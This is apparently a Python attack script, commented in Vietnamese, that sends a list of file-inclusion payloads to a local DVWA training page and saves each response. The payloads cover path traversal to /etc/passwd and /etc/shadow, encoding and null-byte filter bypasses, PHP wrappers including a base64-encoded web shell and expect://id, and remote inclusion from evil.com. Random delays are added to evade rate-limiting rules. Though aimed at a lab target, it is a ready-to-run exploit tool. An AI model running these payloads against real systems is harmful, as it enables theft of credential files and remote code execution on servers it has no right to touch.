import requests, time, random, os

TARGET = 'http://localhost:8080/vulnerabilities/fi/'
# ĐỪNG QUÊN CẬP NHẬT PHPSESSID TỪ TRÌNH DUYỆT CỦA BẠN
COOKIES = {'PHPSESSID': '983dc63d0bda26c28f2b4bd1e70771dd', 'security': 'low'}

PAYLOADS = [
    # --- Classic Directory Traversal ---
    '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd',
    '/etc/passwd', '/etc/issue', '/etc/shadow', '/etc/group', '/etc/hosts',
    '..\\..\\..\\windows\\win.ini', '..\\..\\..\\..\\boot.ini', 'C:/Windows/System32/drivers/etc/hosts',
    
    # --- Evasion via Filter Bypasses ---
    '....//....//....//etc/shadow', '..././..././..././etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',

    # --- Null Byte Injections ---
    '../../../../etc/passwd%00', 'index.php%00', 'config.inc.php%00',
    
    # --- PHP Wrappers ---
    'php://filter/convert.base64-encode/resource=index.php', 
    'php://filter/read=string.rot13/resource=config.php',
    'php://filter/zlib.deflate/convert.base64-encode/resource=config.php',
    'zip://uploads/archive.zip#shell.php',
    'phar://uploads/archive.phar/shell.php',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=',
    'expect://id',
    
    # --- Remote File Inclusion (RFI) ---
    'http://evil.com/shell.txt', 'https://raw.githubusercontent.com/payloads/shell.php',
    'ftp://10.0.0.1/pub/shell.php', 'dict://127.0.0.1:11211'
]

# Tạo thư mục lưu kết quả để dễ kiểm tra
if not os.path.exists('attack_results'):
    os.makedirs('attack_results')

print('--- BẮT ĐẦU KIỂM TRA NỘI DUNG LFI / RFI ---')

for i, p in enumerate(PAYLOADS):
    try:
        # Gửi request
        res = requests.get(TARGET, params={'page': p}, cookies=COOKIES, timeout=5)
        
        # Lấy kích thước gói tin (Bytes)
        resp_size = len(res.content)
        
        # Trích xuất một đoạn text ngắn để hiển thị log cho gọn
        # LFI trên DVWA thường in nội dung tệp ra ngay đầu file HTML
        snippet = res.text.strip()[:100].replace('\n', ' ')
        
        print(f'[{i}] Payload: {p}')
        print(f'    -> Status: {res.status_code} | Size: {resp_size} bytes')
        print(f'    -> Snippet: {snippet}...')
        
        # Lưu toàn bộ response ra file để bạn dễ dàng mở ra soi kỹ nội dung
        safe_filename = f"attack_results/payload_{i}.html"
        with open(safe_filename, 'w', encoding='utf-8') as f:
            f.write(res.text)
            
    except Exception as e:
        print(f'[{i}] Payload: {p} -> LỖI REQUEST: {e}')
        
    # Nghỉ ngơi giữa các request để qua mặt các rule chống Spam
    time.sleep(random.uniform(0.5, 1.5))

print("\n[+] HOÀN TẤT! Hãy mở thư mục 'attack_results/' ra để xem các file vừa trích xuất được.")